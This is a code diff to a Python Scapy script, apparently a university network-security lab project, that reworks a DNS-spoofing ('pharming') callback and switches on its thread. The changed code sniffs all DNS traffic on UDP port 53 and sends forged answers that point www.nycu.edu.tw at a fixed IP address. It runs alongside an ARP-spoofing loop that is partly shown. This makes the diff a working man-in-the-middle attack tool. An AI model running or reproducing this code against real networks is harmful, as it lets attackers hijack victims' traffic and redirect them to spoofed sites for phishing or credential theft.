@@ -167,25 +167,35 @@ def pharming_callback(pkt):
     # trigger each capture
     # http://www.nycu.edu.tw
     # print("\n")
-    pkt.show()
+    print(pkt.show())
     # print(type(pkt))
     # print("\n\n\n")
     # print("callback")
-    try:
-        question = str(pkt[DNS].qd.qname)
-    except:
-        return
+    # try:
+    #     question = str(pkt[DNS].qd.qname)
+    # except:
+    #     return
     # print(question)
-    if question.find('www.nycu.edu.tw') != -1:
-        # find it
-        print('find it')
-        local_ip = '140.113.207.246'
-        spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip)/DNSRR(rrname="trailers.apple.com",rdata=local_ip))
-        scapy.send(spf_resp, verbose=0)
+    # if question.find('www.nycu.edu.tw') != -1:
+    #     # find it
+    #     print('find it')
+    #     local_ip = '140.113.207.246'
+    #     spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip)/DNSRR(rrname="trailers.apple.com",rdata=local_ip))
+    #     scapy.send(spf_resp, verbose=0)
+    local_ip = '140.113.207.246'
+    if (
+            DNS in pkt and
+            pkt[DNS].opcode == 0 and
+            pkt[DNS].ancount == 0
+        ):
+            if "www.nycu.edu.tw" in str(pkt["DNS Question Record"].qname):
+                spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip)/DNSRR(rrname="www.nycu.edu.tw",rdata=local_ip))
+                send(spf_resp, verbose=0, iface=IFACE)
+                return f"Spoofed DNS Response Sent: {pkt[IP].src}"
 
 def pharming(stop):
     # port 53 UDP
-    scapy.sniff(filter="host 172.20.10.4 and udp port 53", count = 10, prn = pharming_callback)
+    scapy.sniff(filter="udp port 53", count = 0, prn = pharming_callback)
 
 
 
@@ -204,9 +214,9 @@ if __name__ == '__main__':
 
 
     # t = threading.Thread(target = sslSplit, args =(lambda : stop_threads, ))
-    # t = threading.Thread(target = pharming, args =(lambda : stop_threads, ))
-    # t.start()
-    # stop_threads = False
+    t = threading.Thread(target = pharming, args =(lambda : stop_threads, ))
+    t.start()
+    stop_threads = False
 
     try:
         sent_packets_count = 0
@@ -223,5 +233,5 @@ if __name__ == '__main__':
         restore(target_ip, gateway_ip)
         print("[-] Arp Spoof Stopped")
         stop_threads = True
-        # t.join()
+        t.join()
         print("stop thread")
